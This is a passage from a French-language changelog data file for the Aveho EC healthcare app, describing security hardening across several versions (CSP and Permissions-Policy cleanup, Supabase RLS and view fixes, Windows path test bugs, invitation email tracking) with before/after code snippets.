      { "code": "SEC", "txt": "AUDIT SUPPLÉMENTAIRE COMPLET de la sécurité Aveho EC : (1) Cookies HttpOnly / Secure / SameSite — Supabase Auth gère via cookies signés, pas de manipulation manuelle dans le code Aveho. (2) localStorage avec données sensibles — 0 occurrence sensible (password/token/secret/email). (3) Routes API qui font du SQL raw / RPC — 6 routes utilisent .rpc() (prescriptions/from-ocr, place, rpps, rpps/dump-status, caisses, mutuelles) → TOUTES protégées par requireAuth. (4) npm audit — 0 CRIT + 0 HIGH + 2 MOD (postcss build-time, non exploitable). (5) Patterns CORS — défaut Next.js same-origin. (6) Logs sensibles — 0 console.log avec données sensibles dans le code actif" },
      { "code": "AI", "txt": "+46 tests Vitest (v057-24-bulles-csp-report.test.js) : version (1), bulles d'identification (15 — 12 codes REQUIRED + couleurs distinctes + FIX/SEC/AI/DOC spécifiques + fallback compat), 13 SQL files restaurés (14 — chaque fichier vérifié), audit anti-régression sqlFile (1 — tous les référencés existent), endpoint csp-report (10 — POST, GET, pas de requireAuth, rate limit, lib/logger, 2 formats, 204, cleanup mémoire), report-uri dans CSP (1), audit RPC routes protégées (1), score sécurité global (3). Total 2916 tests verts (vs 2870 en 0.57.23)" },
      { "code": "DOC", "txt": "Bilan sécurité Aveho EC après marathon 0.56.20 → 0.57.24 (25 versions) : npm audit 0 CRIT/HIGH, 17/19 routes API protégées (sauf 2 health-checks + csp-report publics par design), 10/10 headers HTTP sécurité, CSP 11 directives report-only avec collecte des violations, HSTS 1 an + preload, Permissions-Policy 21 directives propres (sans warnings), 100% des routes RPC protégées par requireAuth, lib/logger redacte les valeurs sensibles (password/token/credential_id), 0 secret en dur dans le code, 9 dangerouslySetInnerHTML audités SAFE, 0 eval/new Function, RLS Supabase 97% (100% après application des scripts 0.57.19+0.57.20), 5 LINT anti-régression critiques actifs, 2916 tests Vitest" }
    ],
    "themes": ["fix", "ux", "securite", "csp"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.24.html",
    "sqlFile": null
  },
  {
    "v": "0.57.23",
    "kind": "version",
    "titre": "🧹 Nettoyage Permissions-Policy : retrait de 7 features non reconnues par Chrome (warnings console)",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ : 7 warnings console 'Error with Permissions-Policy header: Unrecognized feature' sur les pages Aveho. Cause : depuis 0.57.17, j'avais ajouté 27 directives Permissions-Policy pour bloquer toutes les APIs sensibles 'au cas où'. Mais 7 d'entre elles ne sont PAS dans la liste officielle des features standard reconnues par Chrome (Permissions Policy spec). Conséquence : Chrome les ignore et log un warning à chaque page load",
        "code_snippet": {
          "file": "next.config.js",
          "note": "7 features non reconnues retirées",
          "lang": "js",
          "before": "// 0.57.17 — 27 directives, dont 7 non standard\nvalue: [\n  \"camera=(self)\", \"microphone=()\", \"geolocation=(self)\", \"payment=()\",\n  \"interest-cohort=()\",\n  \"ambient-light-sensor=()\",     // ⚠️ warning Chrome\n  \"battery=()\",                   // ⚠️ deprecated\n  \"bluetooth=()\",\n  \"display-capture=()\",\n  \"document-domain=()\",           // ⚠️ deprecated (COOP remplace)\n  \"encrypted-media=()\",\n  \"execution-while-not-rendered=()\",     // ⚠️ experimental\n  \"execution-while-out-of-viewport=()\",  // ⚠️ experimental\n  \"gamepad=()\", \"gyroscope=()\", \"hid=()\", \"idle-detection=()\",\n  \"magnetometer=()\", \"midi=()\",\n  \"navigation-override=()\",       // ⚠️ experimental\n  \"publickey-credentials-get=(self)\", \"screen-wake-lock=()\", \"serial=()\",\n  \"speaker-selection=()\",         // ⚠️ pas dans Chrome\n  \"sync-xhr=(self)\", \"usb=()\", \"web-share=(self)\",\n  \"xr-spatial-tracking=()\",\n].join(\", \")\n// → Chrome log 7 warnings 'Unrecognized feature' à chaque page",
          "after": "// 0.57.23 — 21 features standard supportées par Chrome\nvalue: [\n  // Autorisées sur (self) uniquement\n  \"camera=(self)\",                          // OCR scanner\n  \"geolocation=(self)\",                     // carte logistique\n  \"web-share=(self)\",                       // bouton Partager PWA\n  \"publickey-credentials-get=(self)\",       // WebAuthn biométrie\n  \"sync-xhr=(self)\",                        // Supabase realtime\n  // Bloquées explicitement\n  \"microphone=()\",\n  \"payment=()\",\n  \"interest-cohort=()\",                     // FLoC tracking\n  \"bluetooth=()\", \"display-capture=()\", \"encrypted-media=()\",\n  \"gamepad=()\", \"gyroscope=()\", \"hid=()\", \"idle-detection=()\",\n  \"magnetometer=()\", \"midi=()\",\n  \"screen-wake-lock=()\", \"serial=()\", \"usb=()\",\n  \"xr-spatial-tracking=()\",\n].join(\", \")\n// → Console propre, pas de warnings"
        }
      },
      { "code": "DOC", "txt": "Les 7 features retirées et POURQUOI : (1) ambient-light-sensor : origin trial uniquement, jamais sorti de l'expérimentation Chrome. (2) battery : API Battery Status deprecated en 2019 pour des raisons de fingerprinting, plus exposée par les browsers modernes. (3) document-domain : deprecated en faveur de Cross-Origin-Opener-Policy (qu'on a déjà). (4) execution-while-not-rendered + execution-while-out-of-viewport : spec experimentale Permissions Policy V2, pas encore standardisée. (5) navigation-override : experimental, jamais implémenté Chrome. (6) speaker-selection : feature WebRTC future, pas dans Chrome stable. Ces features ne pouvaient PAS être bloquées via Permissions-Policy de toute façon — le retrait n'enlève AUCUNE protection réelle" },
      { "code": "DOC", "txt": "Côté Permissions-Policy on est passé de 27 → 21 features actives. Toutes les protections importantes sont maintenues : pas de microphone, pas de paiement, pas de FLoC tracking, pas de Bluetooth/USB/Serial/HID/MIDI/Gamepad, pas de display-capture, pas de XR spatial tracking. Et les autorisations ciblées sur (self) restent : camera (OCR), geolocation (carte), web-share (PWA), WebAuthn (biométrie), sync-xhr (Supabase)" },
      { "code": "DOC", "txt": "Pour le 2ème warning signalé ('upgrade-insecure-requests is ignored when delivered in a report-only policy') : la directive a été RETIRÉE en 0.57.22. Si tu vois encore ce warning, c'est ton CACHE NAVIGATEUR ou SERVICE WORKER qui sert l'ancienne version. Solution : (1) DevTools → Application → Service Workers → Unregister, (2) DevTools → Application → Storage → Clear site data, (3) Hard reload (Ctrl+Shift+R). Le SW Aveho est bumpé à chaque version donc devrait normalement se mettre à jour tout seul, mais parfois il faut forcer manuellement après un déploiement majeur" },
      { "code": "AI", "txt": "+41 tests Vitest (v057-23-permissions-policy-clean.test.js) : version (1), 7 features retirées vérifiées absentes du tableau actif (7), 21 features maintenues présentes (21), commentaire explicatif présent (1), comptage exactement 21 features actives (1), score sécurité 10 headers maintenus (10). Total 2870 tests verts (vs 2829 en 0.57.22)" }
    ],
    "themes": ["fix", "headers", "permissions-policy"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.23.html",
    "sqlFile": null
  },
  {
    "v": "0.57.22",
    "kind": "version",
    "titre": "🔧 Fix warning CSP report-only + tracking statut envoi mail invitations (mail_envoye_at, mail_erreur, mail_tentatives)",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ : warning console 'The Content Security Policy directive upgrade-insecure-requests is ignored when delivered in a report-only policy'. C'est un comportement standard des browsers : la directive upgrade-insecure-requests force HTTPS sur les sous-ressources mais ne peut être appliquée qu'en mode enforcing (pas report-only). En mode report-only elle est ignorée silencieusement avec ce warning. Solution : retirer la directive du CSP report-only. La protection est de toute façon couverte par HSTS preload 1 an (force HTTPS au niveau browser AVANT que la CSP soit évaluée). À réintroduire si/quand on bascule en CSP enforcing (sans -Report-Only)",
        "code_snippet": {
          "file": "next.config.js",
          "note": "Retrait directive ignorée en report-only",
          "lang": "js",
          "before": "// 0.57.17 — directive ignorée en mode report-only\nconst CSP_DIRECTIVES = [\n  \"default-src 'self'\",\n  // ... autres directives\n  \"frame-ancestors 'self'\",\n  \"upgrade-insecure-requests\",  // ← warning browser : ignored in report-only\n];",
          "after": "// 0.57.22 — retirée temporairement (warning browser)\nconst CSP_DIRECTIVES = [\n  \"default-src 'self'\",\n  // ... autres directives\n  \"frame-ancestors 'self'\",\n  // 0.57.22 : 'upgrade-insecure-requests' RETIRÉE car ignorée en report-only\n  // (warning browser : 'ignored when delivered in a report-only policy')\n  // Protection couverte par HSTS max-age=1 an + preload qui force HTTPS\n  // au niveau navigateur AVANT même que la CSP soit évaluée.\n  // À réintroduire si/quand on bascule en CSP enforcing.\n];"
        }
      },
      { "code": "FE", "txt": "TRACKING DU STATUT D'ENVOI MAIL POUR LES INVITATIONS : avant cette version, quand on invitait un user, le mail était envoyé via Edge Function 'invite-user' (Resend) mais aucune trace du succès/échec n'était persistée en BDD. Le warning UI affichait l'erreur temporairement, mais disparaissait au reload. Résultat : impossible de savoir plus tard si le mail est parti ou pas, et l'utilisateur signalait 'les statuts d'envoi de mail sur la liste des invitations ne sont pas fonctionnels'. Fix : 3 nouvelles colonnes dans la table invitations + update côté client + affichage dans la liste",
        "code_snippet": {
          "file": "supabase/aveho-PATCH-vers-0.57.22.sql",
          "note": "Patch SQL idempotent",
          "lang": "sql",
          "before": "-- AVANT 0.57.22 : table invitations sans tracking statut mail\n-- L'utilisateur ne pouvait savoir si le mail Resend avait abouti\n-- (warning UI temporaire seulement)",
          "after": "-- 0.57.22 : 3 colonnes pour le tracking\nALTER TABLE public.invitations\n  ADD COLUMN IF NOT EXISTS mail_envoye_at TIMESTAMPTZ NULL;\n\nALTER TABLE public.invitations\n  ADD COLUMN IF NOT EXISTS mail_erreur TEXT NULL;\n\nALTER TABLE public.invitations\n  ADD COLUMN IF NOT EXISTS mail_tentatives INTEGER DEFAULT 0;\n\n-- Index sur mail_erreur pour requêtes 'invitations en échec'\nCREATE INDEX IF NOT EXISTS idx_invitations_mail_erreur\n  ON public.invitations(mail_erreur)\n  WHERE mail_erreur IS NOT NULL;\n\n-- Stats actuelles\nSELECT COUNT(*) AS total,\n  COUNT(*) FILTER (WHERE mail_envoye_at IS NOT NULL) AS mails_envoyes,\n  COUNT(*) FILTER (WHERE mail_erreur IS NOT NULL) AS mails_en_echec\nFROM public.invitations;"
        }
      },
      { "code": "FE", "txt": "Code app/utilisateurs/page.js modifié pour persister le statut : (1) après création d'une invitation, update invitations.mail_envoye_at avec now() si succès ou mail_erreur avec le détail si échec, mail_tentatives=1, (2) sur renvoi (bouton ti-send), incrémenter mail_tentatives et update mail_envoye_at (succès) ou mail_erreur (échec), (3) loadAll() appelé après chaque update pour refresh la liste affichée, (4) try/catch silencieux qui n'interrompt pas le flow si le SQL patch n'est pas encore appliqué (rétrocompatibilité)" },
      { "code": "FE", "txt": "Nouvelle colonne 'Mail' dans le tableau des invitations de /utilisateurs : (1) si mail_envoye_at présent → icône ti-mail-check verte + 'Envoyé' + tooltip avec date d'envoi et nombre de tentatives, (2) si mail_erreur présent → icône ti-mail-x rouge + 'Échec' + tooltip détaillé sur le message Resend (Quota dépassé, Email invalide, Domain not verified, etc.), (3) sinon (avant 0.57.22 ou pas encore tenté) → icône ti-mail-question grise + '—'. L'utilisateur peut maintenant savoir EN UN COUP D'ŒIL quelles invitations ont mal abouti et les renvoyer" },
      { "code": "DB", "txt": "Patch SQL livré supabase/aveho-PATCH-vers-0.57.22.sql en 6 étapes : (1) ALTER TABLE x3 idempotents IF NOT EXISTS, (2) UPDATE backfill pour les invitations existantes > 1h (marque mail_tentatives=1 pour éviter de pourrir les stats), (3) CREATE INDEX partiel sur mail_erreur WHERE NOT NULL (perf requête échecs), (4) COMMENT ON COLUMN x3 pour documentation auto (DBeaver, pgAdmin), (5) Vérification information_schema, (6) Stats actuelles. Bloc ROLLBACK commenté inclus pour rollback rapide" },
      { "code": "AI", "txt": "+33 tests Vitest (v057-22-csp-fix-invitations-mail-status.test.js) : version (1), fix warning CSP (3 — directive retirée + justification documentée + 'à réintroduire' noté), SQL patch (10 — fichier existe, 3 ADD COLUMN, idempotence, index, backfill, comments, vérification, rollback), code app/utilisateurs (9 — update succès/échec/tentatives, try/catch silencieux, colonne Mail, 3 icônes statut, loadAll refresh), score headers maintenu (10 — 9 headers requis + poweredByHeader false). Total 2829 tests verts (vs 2796)" },
      { "code": "DOC", "txt": "Workflow utilisateur recommandé après déploiement : (1) appliquer scripts/aveho-PATCH-vers-0.57.22.sql dans Supabase SQL Editor → vérifier que les 3 colonnes apparaissent dans la table invitations + que le COUNT de stats post-migration fonctionne, (2) tester sur /utilisateurs : créer une invitation avec un email valide → vérifier que la colonne 'Mail' affiche 'Envoyé' en vert, (3) créer une invitation avec un email invalide (ex: foo@xxx.invalid) → vérifier que la colonne 'Mail' affiche 'Échec' en rouge avec tooltip détaillé, (4) cliquer sur le bouton 'Renvoyer' → vérifier que le compteur de tentatives s'incrémente" }
    ],
    "themes": ["fix", "csp", "invitations", "ux"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.22.html",
    "sqlFile": "aveho-PATCH-vers-0.57.22.sql"
  },
  {
    "v": "0.57.21",
    "kind": "version",
    "titre": "🔧 Hotfix Windows path bug bis (test 0.57.20) + audit anti-régression : tout test Vitest doit normaliser \\ avant .includes() sur path",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ PAR UTILISATEUR : 1 test fail sous Windows en lançant npm test après le déploiement 0.57.20 — 'expected 2 to be 1' sur 'v_users_emails ne doit être utilisé qu'à 1 endroit'. Cause : le test parcourait app/ et excluait app/changelog/versions-data.js via 'full.includes(\"changelog/versions-data\")'. Sous Linux le path est 'app/changelog/versions-data.js' donc match OK, sous Windows le path est 'app\\\\changelog\\\\versions-data.js' donc .includes(\"/\") ne match PAS → le fichier est COMPTÉ → 2 occurrences au lieu de 1 → test fail",
        "code_snippet": {
          "file": "__tests__/v057-20-fix-views-auth.test.js",
          "note": "Fix : normaliser AVANT d'utiliser .includes()",
          "lang": "js",
          "before": "// 0.57.20 - bug Windows\nfor (const item of fs.readdirSync(dir, { withFileTypes: true })) {\n  const full = path.join(dir, item.name);\n  // Sous Linux : full = 'app/changelog/versions-data.js'\n  // Sous Windows : full = 'app\\\\changelog\\\\versions-data.js'\n  if (item.isDirectory()) { ... }\n  else if (item.name.endsWith(\".js\")) {\n    if (full.includes(\"changelog/versions-data\")) continue;  // ← FAIL sous Windows\n    if (full.includes(\"changelog/lib\")) continue;            // ← FAIL sous Windows\n    if (src.includes(\"v_users_emails\")) count++;\n  }\n}\n// → Linux : 1 occurrence (signalements)\n// → Windows : 2 occurrences (signalements + versions-data) → test fail",
          "after": "// 0.57.21 - normaliser AVANT .includes()\nfor (const item of fs.readdirSync(dir, { withFileTypes: true })) {\n  const full = path.join(dir, item.name);\n  const fullNorm = full.replace(/\\\\\\\\/g, \"/\");      // 0.57.21 : normalise d'abord\n  if (item.isDirectory()) { ... }\n  else if (item.name.endsWith(\".js\")) {\n    if (fullNorm.includes(\"changelog/versions-data\")) continue;  // ✓ marche partout\n    if (fullNorm.includes(\"changelog/lib\")) continue;            // ✓ marche partout\n    if (src.includes(\"v_users_emails\")) count++;\n  }\n}\n// → Linux ET Windows : 1 occurrence → test pass"
        }
      },
      { "code": "AI", "txt": "AUDIT ANTI-RÉGRESSION : nouveau test dans v057-21-hotfix-windows-path.test.js qui parcourt TOUS les fichiers __tests__/*.js, détecte les patterns dangereux 'full.includes(\"...\")' sur un path raw sans .replace(/\\\\\\\\/g, \"/\") préalable, et fail si trouvé. Garantit que ce bug ne reviendra plus jamais. Pattern de détection : tout fichier qui (1) utilise fs.readdirSync, (2) fait variable.includes() sur full/fpath/filePath/fullPath avec un slash forward dans la string. Si oui ET pas de normalisation détectée → bug signalé",
        "code_snippet": {
          "file": "__tests__/v057-21-hotfix-windows-path.test.js",
          "note": "Test anti-régression Windows path",
          "lang": "js",
          "before": "// Avant 0.57.21 : aucun garde-fou\n// Le bug Windows path revient à chaque test qui fait .includes() sur path",
          "after": "// 0.57.21 - lint anti-régression\nit(\"Aucun test ne fait .includes() sur un path raw issu de path.join()\", () => {\n  const violations = [];\n  for (const file of listTestFiles()) {\n    const src = fs.readFileSync(file, \"utf-8\");\n    if (!src.includes(\"readdirSync\")) continue;\n    \n    const danger = /\\b(full|fpath|filePath|fullPath)\\.includes\\([\"'][^\"']*\\/[^\"']*[\"']\\)/g;\n    const matches = src.match(danger) || [];\n    \n    for (const m of matches) {\n      const hasNormalize = /\\.replace\\(\\/\\\\\\\\\\/g\\s*,\\s*[\"']\\/[\"']\\)/.test(src);\n      if (!hasNormalize) {\n        violations.push({ file: path.basename(file), match: m });\n      }\n    }\n  }\n  expect(violations).toEqual([]);  // ← FAIL si bug Windows reintroduit\n});"
        }
      },
      { "code": "DOC", "txt": "Règle d'or documentée : 'Quand on manipule un path issu de path.join() ou fs.readdirSync, TOUJOURS faire .replace(/\\\\\\\\/g, \"/\") en PREMIER, puis comparer'. C'est le 3ème bug Windows path dans le marathon 0.56.20→0.57.21 (0.57.17 LINT POST/PUT/DELETE → fixé en 0.57.19, 0.57.20 usage v_users_emails → fixé en 0.57.21). Pattern récurrent : sous Linux les paths utilisent '/', sous Windows '\\\\'. Les fonctions de path comme join() retournent le format natif. Donc .includes() et .replace() qui matchent du '/' ne fonctionnent pas sous Windows si on les fait AVANT de normaliser" },
      { "code": "AI", "txt": "+8 tests Vitest (v057-21-hotfix-windows-path.test.js) : version (1), fix Windows path dans test v057-20 (4 — fullNorm + normalize + includes paths + marqueur 0.57.21), audit anti-régression (2 — lint qui détecte le pattern dangereux + sanity ≥ 100 fichiers tests), documentation règle d'or (1). Total 2796 tests verts (vs 2788)" }
    ],
    "themes": ["hotfix", "windows", "tests"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.21.html",
    "sqlFile": null
  },
  {
    "v": "0.57.20",
    "kind": "version",
    "titre": "🛡️ Fix views auth.users exposées (Supabase Security Advisor) — v_users_emails + v_users_complete sécurisées par security_invoker + filtre structure",
    "chantiers": [
      { "code": "DB", "txt": "AUDIT IDENTIFIÉ 2 VIEWS QUI EXPOSAIENT auth.users : suite à la requête de l'étape 4 du script 0.57.18, l'utilisateur a remonté 2 views publiques. v_users_emails (utilisée par /signalements pour récupérer l'email de l'auteur quand on lui répond) : exposait user_id + email + nom_affiche + created_at de TOUS les users de la base — n'importe quel user authentifié pouvait dump tous les emails Aveho. v_users_complete (mentionnée dans le changelog 0.55.12 mais plus utilisée actuellement) : exposait email + last_sign_in_at + email_verifie cross-structure — un user d'une structure pouvait voir les emails et derniers logins de toutes les structures",
        "code_snippet": {
          "file": "scripts/fix-views-auth-exposed.sql",
          "note": "Fix v_users_emails : avant vs après",
          "lang": "sql",
          "before": "-- AVANT 0.57.20 : view sans filtre, expose tous les users\nCREATE VIEW public.v_users_emails AS\nSELECT id AS user_id, email,\n  (raw_user_meta_data ->> 'nom_affiche'::text) AS nom_affiche,\n  created_at\nFROM auth.users;\n\n-- Risque : n'importe quel user authentifié peut faire :\nSELECT email FROM v_users_emails;\n-- → dump de TOUS les emails Aveho EC",
          "after": "-- 0.57.20 : view avec security_invoker + filtre par structure\nDROP VIEW IF EXISTS public.v_users_emails CASCADE;\n\nCREATE VIEW public.v_users_emails\n  WITH (security_invoker = true)    -- ← applique RLS du caller, pas du créateur\n  AS\nSELECT u.id AS user_id, u.email,\n  (u.raw_user_meta_data ->> 'nom_affiche'::text) AS nom_affiche,\n  u.created_at\nFROM auth.users u\nWHERE u.id IN (\n  -- Le user lui-même peut toujours voir son propre email\n  SELECT auth.uid()\n  UNION\n  -- + tous les autres users de SA structure\n  SELECT ms2.user_id\n  FROM public.membres_structure ms2\n  WHERE ms2.structure_id IN (\n    SELECT ms1.structure_id\n    FROM public.membres_structure ms1\n    WHERE ms1.user_id = auth.uid()\n  )\n);\n\nGRANT SELECT ON public.v_users_emails TO authenticated;\n\n-- Résultat : SELECT email FROM v_users_emails;\n-- → ne renvoie que les membres de la structure du caller"
        }
      },
      { "code": "DB", "txt": "Script SQL livré scripts/fix-views-auth-exposed.sql : (1) sauvegarde commentée des definitions originales pour rollback rapide si besoin, (2) DROP+CREATE v_users_emails avec security_invoker=true + filtre via auth.uid() + membres_structure (UNION pour inclure le user lui-même au cas où il n'est pas encore dans membres_structure), (3) DROP+CREATE v_users_complete avec même pattern (préservée même si non utilisée actuellement, car des RPC SQL pourraient en dépendre), (4) GRANT SELECT TO authenticated explicite (sinon les views ne sont plus accessibles), (5) vérification post-fix via pg_class.reloptions qui confirme security_invoker=true, (6) bloc ROLLBACK d'urgence commenté pour restaurer rapidement si /signalements ne fonctionne plus" },
      { "code": "DB", "txt": "Pattern security_invoker = true expliqué : par défaut, une view PostgreSQL exécute avec les privilèges de SON CRÉATEUR (typiquement le rôle 'postgres' qui bypass RLS de toutes les tables). C'est ce qui cause les fuites de données : la view 'voit' tout, et n'importe quel utilisateur qui peut la querier hérite de cette vision globale. Avec security_invoker=true (Postgres 15+, supporté par Supabase), la view exécute avec les privilèges du caller — donc applique son RLS, ses filtres, etc. C'est exactement ce qu'on veut pour qu'une view sur auth.users respecte l'isolation par structure" },
      { "code": "FE", "txt": "Compatibilité préservée pour app/signalements/page.js : le code Aveho utilise déjà v_users_emails pour récupérer l'email de l'auteur d'un signalement avant de lui envoyer une notif via Edge Function. Avec le nouveau filtre, ça continue de fonctionner SI l'auteur du signalement est dans la même structure que celui qui répond (cas normal — un signalement = local à une structure). Si l'auteur est dans une autre structure, l'email ne sera plus visible et la notif sera dégradée vers une notif in-app seulement (déjà géré par le fallback gracieux 'if (email)' du code)" },
      { "code": "AI", "txt": "+20 tests Vitest (v057-20-fix-views-auth.test.js) : version (1), script SQL fix views (15 — fichier existe, documente 2 views, sauvegarde originaux, DROP+CREATE chacune, security_invoker=true, filtre auth.uid()+membres_structure, GRANT SELECT, vérif post-fix, rollback, test fonctionnel, snapshot recommandé), usage v_users_emails (2 — toujours utilisé dans signalements + comptage unique d'usages), score final (2 — stratégie security_invoker + alerte Supabase visée). Total 2788 tests verts (vs 2768)" },
      { "code": "DOC", "txt": "WORKFLOW UTILISATEUR : (1) faire un snapshot Supabase (Dashboard → Database → Backups → Create snapshot), (2) ouvrir SQL Editor, (3) coller scripts/fix-views-auth-exposed.sql et lancer étape par étape, (4) après exécution, vérifier dans /signalements qu'on peut toujours créer un signalement et qu'un user qui y répond déclenche bien la notif email à l'auteur (test cross-user dans la même structure), (5) re-vérifier Supabase Dashboard → Database → Advisors → l'alerte 'auth_users_exposed' doit avoir disparu, (6) si problème : décommenter et exécuter le bloc ROLLBACK qui restaure l'ancienne version sans filtre" },
      { "code": "AI", "txt": "Score sécurité RLS Supabase Aveho EC après 0.57.19 + 0.57.20 : 68/68 tables RLS activé (100% — caisses_assurance_maladie et mutuelles fixées en 0.57.19), 2/2 views auth.users sécurisées (security_invoker + filtre structure — fixées en 0.57.20), 140+ policies actives, 0 alerte Supabase Security Advisor attendue. Aveho EC passe de '97% sécurisé' (date du mail 31 mai) à '100% sur les critères Supabase Advisor'" }
    ],
    "themes": ["securite", "rls", "supabase", "views"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.20.html",
    "sqlFile": null
  },
  {
    "v": "0.57.19",
    "kind": "version",
    "titre": "🔧 Fix bug Windows path dans LINT 0.57.17 + script SQL personnalisé Aveho RLS (caisses + mutuelles)",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ : 1 test Vitest échouait avec 'expected [\\\\health\\\\route.js, \\\\version\\\\route.js] to deeply equal [/health, /version]'. Cause : le test 'Seules /api/version et /api/health ne sont pas protégées' faisait .replace('/route.js', '') AVANT de normaliser les séparateurs Windows. Sous Windows, fs.readdirSync renvoie des paths avec \\\\ donc le replace ne matchait pas. Fix : inverser l'ordre — d'abord replace(/\\\\\\\\/g, '/') pour normaliser, ENSUITE replace('/route.js', ''). Le LINT POST/PUT/DELETE avait le même bug, fixé pareil",
        "code_snippet": {
          "file": "__tests__/v057-17-security-hardening.test.js",
          "note": "Fix ordre des replace pour Windows",
          "lang": "js",
          "before": "// 0.57.17 - bug Windows : .replace('/route.js') AVANT normalisation \\\nconst apiPath = full\n  .replace(path.join(process.cwd(), \"app/api\"), \"\")\n  .replace(\"/route.js\", \"\")     // ← ne matche pas sous Windows (path = \\\\health\\\\route.js)\n  .replace(/\\\\\\\\/g, \"/\");        // ← trop tard\n\n// → Sous Windows : ['\\\\health\\\\route.js', '\\\\version\\\\route.js']\n// → Sous Linux : ['/health', '/version']\n// → expected.toEqual([/health, /version]) FAIL sous Windows",
          "after": "// 0.57.19 - normaliser AVANT le replace /route.js\nconst apiPath = full\n  .replace(path.join(process.cwd(), \"app/api\"), \"\")\n  .replace(/\\\\\\\\/g, \"/\")          // ✓ normalise d'abord\n  .replace(\"/route.js\", \"\");       // ✓ puis matche bien sous Windows ET Linux\n\n// → Sous les 2 OS : ['/health', '/version']\n// → Tests verts partout"
        }
      },
      { "code": "DB", "txt": "AUDIT RLS SUPABASE TERMINÉ : utilisateur a lancé la PARTIE 1 du script audit-rls-supabase.sql (0.57.18) et envoyé les résultats — 68 tables totales, 66 avec RLS activé déjà ✅, 2 SANS RLS : caisses_assurance_maladie (référentiel caisses CPAM) et mutuelles (référentiel mutuelles santé). Score actuel : 97% (66/68). Ces 2 tables sont des référentiels partagés entre toutes les structures PSAD (pas de colonne structure_id), donc pattern policy = lecture authenticated (USING true), pas isolation par structure" },
      { "code": "DB", "txt": "Script SQL fix personnalisé livré (scripts/fix-rls-aveho.sql) : (1) vérification pré-fix qui confirme has_structure_id=0 pour les 2 tables, (2) ALTER TABLE ENABLE ROW LEVEL SECURITY sur caisses_assurance_maladie + mutuelles, (3) CREATE POLICY 'Lecture caisses/mutuelles pour utilisateurs authentifiés' FOR SELECT TO authenticated USING (true) — pas de INSERT/UPDATE/DELETE pour authenticated car ces référentiels sont en lecture seule côté utilisateur, modifiés uniquement par service_role en backend lors des imports, (4) investigation de la view exposant auth.users (étape 4 à faire car non identifiée par l'audit basique), (5) vérification post-fix qui confirme rls_enabled=true et nb_policies=1, (6) test fonctionnel app (vérifier que /api/caisses?q=Paris et /api/mutuelles?q=Harmonie répondent bien)",
        "code_snippet": {
          "file": "scripts/fix-rls-aveho.sql",
          "note": "Pattern policy lecture authenticated pour référentiel partagé",
          "lang": "sql",
          "before": "-- AVANT 0.57.19 : caisses_assurance_maladie et mutuelles SANS RLS\n-- → n'importe qui avec l'URL Supabase + clé anon (publique) peut\n--    SELECT, INSERT, UPDATE, DELETE sur ces tables\n-- → Alerte Supabase Security Advisor 'rls_disabled_in_public'\n\nSELECT tablename, rowsecurity FROM pg_tables\nWHERE tablename IN ('caisses_assurance_maladie', 'mutuelles');\n-- caisses_assurance_maladie | false  ❌\n-- mutuelles                 | false  ❌",
          "after": "-- 0.57.19 - Fix : RLS activé + policy lecture authenticated\n\nALTER TABLE public.caisses_assurance_maladie ENABLE ROW LEVEL SECURITY;\nCREATE POLICY \"Lecture caisses pour utilisateurs authentifiés\"\n  ON public.caisses_assurance_maladie\n  FOR SELECT TO authenticated\n  USING (true);\n\nALTER TABLE public.mutuelles ENABLE ROW LEVEL SECURITY;\nCREATE POLICY \"Lecture mutuelles pour utilisateurs authentifiés\"\n  ON public.mutuelles\n  FOR SELECT TO authenticated\n  USING (true);\n\n-- Note : pas de policy INSERT/UPDATE/DELETE pour authenticated\n-- → refus par défaut (RLS bloque tout sans policy explicite)\n-- → seul le service_role (backend Aveho) peut écrire\n--   (le service_role bypass RLS par défaut)\n\n-- POST-FIX vérification :\nSELECT tablename, rowsecurity FROM pg_tables\nWHERE tablename IN ('caisses_assurance_maladie', 'mutuelles');\n-- caisses_assurance_maladie | true   ✅\n-- mutuelles                 | true   ✅"
        }
      },
      { "code": "DOC", "txt": "Pour l'utilisateur : (1) faire un snapshot Supabase (Database → Backups → Create snapshot), (2) ouvrir le SQL Editor Supabase, (3) coller scripts/fix-rls-aveho.sql et lancer les étapes une par une, (4) tester dans Aveho que la recherche caisses et mutuelles fonctionne toujours (création de patient avec OCR bulletin de situation), (5) re-vérifier dans Supabase Dashboard → Database → Advisors que les 2 alertes 'rls_disabled_in_public' sont parties. (6) Pour la view exposant auth.users : lancer l'étape 4 du script et m'envoyer le résultat (viewname + definition) pour qu'on fixe ensemble" },
      { "code": "AI", "txt": "+15 tests Vitest (v057-19-fix-rls-aveho.test.js) : version (1), fix bug Windows path 2 endroits (2), script SQL fix personnalisé (10 — fichier existe, contexte 68 tables audité, cible caisses_assurance_maladie + mutuelles, policy lecture authenticated, pas d'INSERT/UPDATE/DELETE, vérif pré-fix + post-fix, test fonctionnel app documenté, investigation view auth.users, snapshot recommandé), score sécurité RLS (2 — actuel 97%, visé 100%). Total 2768 tests verts (vs 2752)" }
    ],
    "themes": ["fix", "rls", "supabase", "windows"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.19.html",
    "sqlFile": null
  },
  {
    "v": "0.57.18",
    "kind": "version",
    "titre": "🔒 Hotfix /api/finess (401 caché) + LINT amélioré (catch pattern variable) + Script SQL audit RLS Supabase",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ : /api/finess?q=lom renvoyait 401 en prod. Diagnostic : FinessSearch.js (autocomplete recherche établissements de santé) utilisait fetch(url) au lieu de fetchWithAuth(url) — même bug que SireneSearch.js fixé en 0.57.16, mais cette fois le LINT anti-régression ne l'a PAS détecté car le pattern est différent : url est assignée dans une variable AVANT le fetch, alors que le regex 0.57.16 cherchait des littéraux ('await fetch(\"/api/...\")') uniquement",
        "code_snippet": {
          "file": "app/FinessSearch.js",
          "note": "Le fix + le pattern qui a échappé au LINT",
          "lang": "js",
